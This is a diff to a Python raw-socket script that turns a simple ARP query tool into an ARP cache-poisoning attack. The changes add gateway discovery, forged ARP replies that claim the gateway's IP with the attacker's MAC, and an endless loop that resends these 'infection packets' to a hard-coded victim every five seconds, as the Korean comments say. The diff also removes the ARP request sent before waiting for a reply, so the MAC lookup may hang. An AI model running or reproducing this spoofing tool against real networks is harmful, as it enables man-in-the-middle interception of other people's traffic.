@@ -4,7 +4,9 @@ Writer Kcrong
 python3 main.py [victim ip]
 """
 
+import os
 import re
+import time
 import subprocess
 import binascii
 from socket import *
@@ -17,12 +19,14 @@ class ARP:
     @staticmethod
     def pretty_mac(mac):
         unpacked = binascii.hexlify(mac).decode('utf-8')
-        return ":".join([i+j for i, j in zip(unpacked[::2], unpacked[1::2])])
+        return ":".join([i + j for i, j in zip(unpacked[::2], unpacked[1::2])])
 
     def __init__(self, victim):
-        self.target_ip = victim
+        self.victim_ip = victim
+        self.gateway_ip = self._get_gateway_ip()
         self.name, self.ip, self.mac = self._get_my_interface_info()
-        self.target_mac = self._get_victim_mac()
+        self.victim_mac = self._get_mac(self.victim_ip)
+        self.gateway_mac = self._get_mac(self.gateway_ip)
 
     def _get_my_interface_info(self):
         """
@@ -31,12 +35,17 @@ class ARP:
         :return: ip address that connect with victim
         """
         with socket(AF_INET, SOCK_DGRAM) as s:
-            s.connect((self.target_ip, 219))  # 219 is ARP port
+            s.connect((self.victim_ip, 219))  # 219 is ARP port
             my_ip = s.getsockname()[0]
 
         name, mac = self._get_interface_info(my_ip)
 
         return name, my_ip, mac
+
+    @staticmethod
+    def _get_gateway_ip():
+        output = os.popen("""route -n | grep 'UG[ \t]' | awk '{print $2}'""").read()
+        return output.split()[0]
 
     @staticmethod
     def _get_interface_info(ip):
@@ -81,17 +90,34 @@ class ARP:
     def send_arp(self, send_type):
         """
         send_type 에 따라 target_ip에 arp 패킷을 전송합니다.
+            ARP_REQUEST_OP: target_ip 에게 ARP 질의 패킷을 전송합니다.
+            ARP_REPLY_OP: gateway_ip 를 송신자로 위조한 ARP 응답 패킷을 target_ip 에게 전송합니다.
 
-        :param send_type: Request 나 Receive 에 대한 Opcode.
+        :param send_type: Request 나 Receive 에 대한 Opcodes.
+
         :return: None. Just send packet
         """
+
+        target_mac = ZERO_MASK
 
         s = socket(AF_PACKET, SOCK_RAW, SOCK_RAW)
         s.bind((self.name, SOCK_RAW))
 
-        packed_sender_mac = s.getsockname()[4]
-        packed_sender_ip = self._packing_ip(self.ip)
-        packed_target_ip = self._packing_ip(self.target_ip)
+        packed_target_ip = self._packing_ip(self.victim_ip)
+        packed_target_mac = target_mac
+
+        # REQUEST packet
+        if send_type == ARP_REQUEST_OP:
+            print("Request~")
+            packed_sender_mac = self.mac
+            packed_sender_ip = self._packing_ip(self.ip)
+
+        else:
+            print("Reply~")
+            packed_sender_ip = self._packing_ip(self.gateway_ip)
+
+            # My Spoofing Trick~
+            packed_sender_mac = self.mac
 
         packet_frame = [
             # # Ethernet Frame
@@ -104,7 +130,7 @@ class ARP:
             # Protocol type
             ARP_TYPE_ETHERNET_PROTOCOL,
 
-            # ############################################3
+            # ############################################
             # # ARP
             ARP_PROTOCOL_TYPE,
 
@@ -117,8 +143,8 @@ class ARP:
             # Sender IP addr
             packed_sender_ip,
 
-            # Broadcast? Unicast?
-            ZERO_MASK,  # i just want unicast
+            # Target MAC addr
+            packed_target_mac,
 
             # Target IP addr
             packed_target_ip
@@ -126,13 +152,13 @@ class ARP:
             # Done!
         ]
 
-        print("Send to %s" % self.target_ip)
+        print("Send packet")
 
         # GOGOGO!
         # Just byte code
         s.send(b''.join(packet_frame))
 
-    def _receive_arp(self, target_ip):
+    def _get_mac(self, target_ip):
         """
         target_ip 의 Reply packet 을 확인하여 mac 주소를 반환합니다.
         :param target_ip: target's ip address
@@ -140,9 +166,6 @@ class ARP:
         """
 
         print("Waiting For ARP-Reply...")
-
-        # Before waiting ARP-REPLY, Send REQUEST
-        self.send_arp(ARP_REQUEST_OP)
 
         s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
 
@@ -164,21 +187,17 @@ class ARP:
                 print("Target MAC detected: %s" % self.pretty_mac(mac))
                 return mac
 
-    def _get_victim_mac(self):
-        """
-        target_ip 에게 ARP Request 를 보내 MAC 주소를 받아옴
-
-        :return: victim's mac address
-        """
-        return self._receive_arp(self.target_ip)
-
 
 def main():
-    victim_ip = '192.168.1.1'
+    victim_ip = '192.168.1.82'
     arp = ARP(victim_ip)
 
-    arp.send_arp(ARP_REQUEST_OP)
+    # target에 변조된 ARP 패킷을 보냄
+    # target의 arp-table 을 변조
 
+    while True:
+        arp.send_arp(ARP_REPLY_OP)
+        time.sleep(5)  # 5초 마다 감염 패킷 전송
 
 if __name__ == '__main__':
     main()
